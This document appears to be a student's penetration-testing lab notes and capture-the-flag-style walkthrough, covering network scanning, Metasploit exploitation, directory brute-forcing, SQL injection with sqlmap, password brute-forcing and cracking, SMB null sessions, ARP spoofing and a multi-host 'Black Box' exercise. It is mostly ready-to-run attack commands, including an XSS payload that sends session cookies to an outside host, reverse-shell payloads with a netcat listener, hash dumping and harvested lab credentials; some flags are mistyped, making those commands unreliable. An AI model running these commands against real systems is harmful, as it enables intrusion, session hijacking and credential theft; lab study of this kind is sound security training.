## Information gathering 

---

## Footprinting & Scanning

### Scanning and OS Fingerprinting

Run a ping scan with fping

```
fping -a <ip>/<subnet> 2> /dev/null
```

Run a ping scan with nmap, do you find any differences? Can you tell why?

```
sudo nmap -sn <ip>/<subnet>
```

Perform a SYN scan against the targets. Identify clients and servers

```
sudo nmap -sC <ip>
```

Identify the version of every daemon listening on the network

```
sudo nmap -sV <ip>
```

Identify, if it is possible, the operating system running on each host

```
sudo nmap -O <ip>
```

---

## Vulnerability Assessment

### Nessus

Find a target in the network

```
sudo nmap -sn <ip>/<subnet>
```

Identify the target role

```
sudo nmap -sC -sV <ip>
```

Configure Nessus and run the scan

Analyze and export the scan results

[OPTIONAL] Exploit the machine

```
msfconsole
```

```
search MS08-067
use 0
set PAYLOAD windows/meterpreter/reverse_tcp
set RHOSTS <ip>
set LHOST <ip>
run
```

---

## Web Attacks

### Dirbuster 

Find all the machines in the network

```
sudo nmap -sn <ip>
```

Identify the machines role

```
sudo nmap -sC -SV <ip>
```

Explore the web application

```
gobuster dir -u http://<ip>:<port> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

Find hidden files

/include/conf.old

Test the credentials found

```
mysql -h <ip> -u <username> -p 
```

Retrieve the correct admin password

/signup.php

```
mysql -h <ip> -u <username> -p 
```

```
show databases;
use <database>;
show tables;
SELECT * FROM <table>;
```

### Cross Site Scripting

Find all the XSS

```
<i>Hello</i>

<script>alert(document.cookie)</script>
```

Steal the admin session cookies

```
<script>new Image().src="http://192.168.99.11/get.php?cookie=" + document.cookie</script>
```

### SQL injection

Explore the web application

```
' or 1=1;-- -
```

Test and exploit the injection points

```
http://10.124.211.96/newsdetails.php/id=1 or 1=1; -- -

http://10.124.211.96/newsdetails.php/id=1 or 1=2; -- -
```

Dump the data

```
sqlmap -u http://10.124.211.96/newsdetails.php/id=1 --dbs

sqlmap -u http://10.124.211.96/newsdetails.php/id=1 -D asd --tables

sqlmap -u http://10.124.211.96/newsdetails.php/id=1 -D asd -T accounts --dump 
```

Login without using any credential

```
' or 1=1;-- -
```

---

### Bruteforce and Password and Cracking

Find alive host on this network

```
sudo nmap -sn <ip>/<subnet>
```

Port scan and service detection

```
sudo nmap -sC -sV <ip>
```

Bruteforce and service authentication

```
hydra -U <userlist> -P <wordlist> <ip> ssh -t 4 -V
```

Download and crack the local password on the system

```
hashcat -m 1800 -w <wordlist> pass.txt
```

---

### Null Sessions

Find the target network

```
sudo nmap -sn <ip>/<subnet>
sudo nmap -sC -sV <ip>
```

Check for null sessions

```
enum4linux -a <ip>
```

Exploit null session

```
smbclient //<ip>/WorkSharing -N
```

```
dir
get Congratulations.txt
```

---

### ARP Poison

Identify the telnet server and the client machine

```
sudo nmap -sn 10.100.13.0/24
sudo nmap -sC -sV 10.100.13.36
sudo nmap -sC -sV 10.100.13.37
```

Intercept traffic between the two

```
sudo bash `echo 1 > /proc/sys/net/ipv4/ip_forward`
arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36
```

Analyze the traffic and steal valid credentials

```
filter: telnet
follow tcp stream
```

elsuser:Mys3crtP455

Login into the telnet server

```
telnet -l elsuser 10.100.13.37
```

----

### Metasploit

Find the target in the network

```
sudo nmap -sn <ip>/<subnet>
```

Identify available services on the target

```
sudo nmap -sC -sV <ip>
```

Find a vulnerable service in Metasploit

```
msfconsole
```

```
search freeftpd
use 0
```

Configure the module and exploit the machine

```
set RHOSTS 192.168.99.12
set LHOST tap0
run
```

Obtain SYSTEM privilage on the machine

```
migrate 1488
```

Get password hashes and crack them

```
hashdump
```

```
hashcat -m 3000 -o crack.txt /usr/share/wordlist/rockyou.txt
```

Administrator:

eLSAdmin:

Locate and download the congrats.txt file

```
locate -f congrats.txt
download <loc>\congrats.txt
```

----


## Black Box 1

ENUMERATION
```
sudo nmap -sc 172.16.64.0/24
sudo nmap -sC -sV 172.16.64.101,140,182,199 -oA nmap/bb1
```

### Box1 172.16.64.101 (Apache Tomcat 8.0.32)

ENUMERATION
```
gobuster dir -u http://172.16.64.101:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

> /manager

tomcat:s3cret

FOOTHOLD
```
msfvenom -p java/shell_reverse_tcp lhost=172.16.64.10 lport=4321 -f war -o pwn.war
```
```
nc -lnvp 4321
```

LATERAL MOVEMENT
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Box2 172.16.64.140 (Apache hppd 2.4.18)

ENUMERATION
```
gobuster dir -u http://172.16.64.140:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

> /img /project /css

```
gobuster dir -u http://172.16.64.140:80/project -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -P admin -U admin -z
```
> /images /css /includes /backup 

```
gobuster dir -u http://172.16.64.140:80/project/backup -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -P admin -U admin -z
```
> /test

LOOT
> database cred = fooadmin:fooadmin


### Box3 172.16.64.182 (ssh)
FOOTHOLD
```
ssh developer@172.16.64.182
```

### Box4 172.16.64.199 (ms-sql)
FOOTHOLD
```
msfconsole
```

```
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 172.16.64.199
set USERNAME fooadmin
set PASSWORD fooadmin
run
```

```
use auxiliary/scanner/msql/msql_enum
set RHOSTS 172.16.64.199
set USERNAME fooadmin
set PASSWORD fooadmin
run
```

```
use exploit/windows/mssql/mssql_payload
set RHOSTS 172.16.64.199
set USERNAME fooadmin
set PASSWORD fooadmin
set LHOST tap0
run
```

```
download id_rsa.pub
```

LOOT
> ssh cred = developer:dF3334slkw

----

